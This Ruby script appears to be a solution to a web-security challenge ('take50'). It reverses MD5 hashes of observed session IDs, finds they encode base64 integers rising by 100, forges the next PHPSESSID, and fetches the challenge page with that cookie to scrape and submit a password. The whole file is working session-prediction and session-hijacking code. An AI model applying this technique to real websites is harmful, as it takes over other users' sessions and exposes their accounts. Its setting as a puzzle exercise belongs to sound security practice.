# encoding:utf-8
require_relative 'hack_utils'
require 'digest/md5'
require 'base64'

begin
   session_histories = %w(
    d087b2a758e31b8e026425ab68ec6522
    45dedbe49c95fce54c4561bbf240f4e1
    1974dc043923c87497e040acd0a23d38
  )
  md5s = session_histories.map{|s| HackUtils.reverse_md5(s) }
  b64dec = md5s.map{|m| Base64.decode64(m) }
  puts "md5 -> base64 -> int"
  session_histories.zip(md5s, b64dec).each do |s, m, b|
    puts "#{s} -> #{m} -> #{b}"
  end
rescue => e
  puts e
end

# session id increases 100 each session.
# 180 -> 280 -> 380
session_id = Digest::MD5.hexdigest(Base64.encode64("480").strip)
puts "session id: #{session_id}" # 480 -> 5dc50099e1e7a42f60169d68daeb4025
cookies = {}
cookies['PHPSESSID'] = session_id
url ='http://whitecafe.moe.hm/take50_sub/index.php'
resp= RestClient.get(url, :cookies => cookies)
resp.body.force_encoding('utf-8')
puts '-' * 20
puts resp.body
puts '-' * 20
pass = resp.body.match(/パスワードは、(.*)です。/).to_a[1]

puts "pass: "+ pass
doc = HackUtils.post_answer(50, :pass => pass)
